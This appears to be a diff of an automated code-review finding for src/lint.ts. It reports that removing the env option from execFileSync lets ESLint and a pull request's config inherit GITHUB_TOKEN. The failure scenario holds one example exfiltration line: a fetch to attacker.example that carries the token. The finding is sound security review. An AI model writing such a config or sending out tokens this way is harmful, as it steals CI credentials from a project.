@@ -1,6 +1,6 @@
 src/lint.ts
 
-  P1 | Blocks merge | Trust boundary | Verifier confirmed | Affected by this change
+  P1 | Blocks merge | Trust boundary | Verifier confirmed | Caused by this change
   Line 8: execFileSync in lint no longer sets env, so ESLint, and the head's configuration it loads, inherits every variable of the process, GITHUB_TOKEN included.
     Why here: This change deleted the env option that limited the linter to PATH and HOME.
     Failure scenario: A pull request adds an eslint.config.js that calls fetch("https://attacker.example/?t=" + process.env.GITHUB_TOKEN) when ESLint loads it. main.ts lints that head's worktree, execFileSync passes the whole environment, and the token publish.ts uses leaves the runner; the base passed only PATH and HOME.
